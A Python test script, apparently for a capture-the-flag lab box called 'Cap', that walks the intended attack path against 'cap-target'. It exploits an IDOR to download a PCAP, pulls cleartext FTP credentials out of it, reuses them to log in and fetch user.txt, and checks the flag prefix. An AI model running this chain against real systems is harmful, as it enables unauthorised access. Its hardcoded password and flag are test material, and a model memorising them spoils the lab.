#!/usr/bin/env python3
"""Independent attacker test for Cap's real IDOR/PCAP/FTP path."""
import ftplib
import socket
import urllib.error
import urllib.request

BASE = "http://cap-target"
for port, prefix in ((21, b"220"), (22, b"SSH-2.0-")):
    with socket.create_connection(("cap-target", port), timeout=6) as sock:
        assert sock.recv(180).startswith(prefix), f"Missing real service banner on {port}"

with urllib.request.urlopen(BASE + "/", timeout=8) as response:
    home = response.read()
assert b"Security Dashboard" in home and b"Nathan" in home

with urllib.request.urlopen(BASE + "/data/0", timeout=8) as response:
    assert response.status == 200
with urllib.request.urlopen(BASE + "/download/0", timeout=8) as response:
    pcap = response.read()
assert pcap[:4] in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4", b"\x0a\x0d\x0d\x0a")
assert b"USER nathan" in pcap and b"PASS Buck3tH4TF0RM3!" in pcap, "Seed PCAP lacks a real FTP login"

ftp = ftplib.FTP("cap-target", timeout=8)
ftp.login("nathan", "Buck3tH4TF0RM3!")
listing = []
ftp.retrlines("LIST", listing.append)
assert any("user.txt" in line for line in listing)
downloaded = bytearray()
ftp.retrbinary("RETR user.txt", downloaded.extend)
assert downloaded.startswith(b"TTP{cap_ci_private_user")
ftp.quit()

# A live five-second tcpdump is started by the real web app, then redirected
# to the next globally increasing capture ID.
try:
    urllib.request.urlopen(BASE + "/capture", timeout=12)
except urllib.error.HTTPError as err:
    raise AssertionError(f"capture endpoint failed: {err.code}") from err
print("PASS: real FTP/SSH -> IDOR PCAP download -> credentials -> FTP password reuse -> live capture")
